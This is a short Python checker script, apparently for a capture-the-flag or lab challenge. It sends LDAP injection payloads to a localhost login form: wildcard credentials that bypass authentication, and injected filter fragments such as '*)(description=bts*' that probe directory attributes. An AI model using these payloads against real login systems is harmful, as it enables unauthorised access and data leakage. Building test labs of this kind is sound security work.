#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

URL = "http://localhost"

def check_basic():
      response = requests.get(URL)
      if response.status_code != 200 or not "Lightweight" in response.text:
            print("Wrong response on /")
            exit(1)


def check_bypass():
      response = requests.post(URL, data={"username": "*", "password": "*"})
      if response.status_code != 200 or not "Welcome" in response.text:
            print("Bypass failed")
            exit(1)


def check_description():
      response = requests.post(URL, data={"username": "*)(description=bts*", "password": "*"})
      if response.status_code != 200 or not "Welcome" in response.text:
            print("Description match failed")
            exit(1)
      
      response = requests.post(URL, data={"username": "*)(description=WRONG*", "password": "*"})
      if response.status_code != 401:
            print("Description match false positive")
            exit(1)
            

check_basic()
check_bypass()
check_description()
